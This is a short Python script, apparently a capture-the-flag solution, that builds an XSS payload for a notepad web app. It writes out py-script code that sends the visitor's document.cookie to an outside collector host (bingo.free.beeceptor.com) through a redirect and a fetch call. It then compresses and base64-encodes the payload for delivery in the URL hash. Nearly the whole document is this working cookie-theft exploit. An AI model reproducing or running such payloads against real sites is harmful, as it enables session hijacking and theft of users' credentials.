# Solution:
# Use big brain skills

from lzma import compress, decompress
from base64 import b64encode, b64decode
import json


notes = [
    {"prompt":"import js;js.console.log('bingbingbing');js.document.location='https://bingo.free.beeceptor.com'+js.document.cookie", "answer": "", "tag": "py-script"},
]

notes = [
    {"prompt":"import js;js.console.log('bingbingbing');js.fetch('https://bingo.free.beeceptor.com/?q='+js.document.cookie)", "answer": "", "tag": "py-script"},
]


# Send in this as the hash to the notepad thing and you get xss :)
print(b64encode(compress(json.dumps(notes).encode())))
